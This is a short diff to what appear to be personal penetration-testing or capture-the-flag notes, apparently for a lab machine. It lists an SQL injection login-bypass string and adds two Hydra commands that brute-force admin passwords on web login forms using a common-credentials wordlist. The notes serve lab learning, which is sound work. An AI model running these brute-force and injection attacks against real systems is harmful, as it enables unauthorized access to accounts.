@@ -25,3 +25,13 @@ https://rumkin.com/tools/cipher/ for ciphers
 
 sqlinjection try: `admin'-- -`
 
+Using Hydra
+
+```
+hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid"
+```
+
+```
+hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.162.247 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect"
+
+```
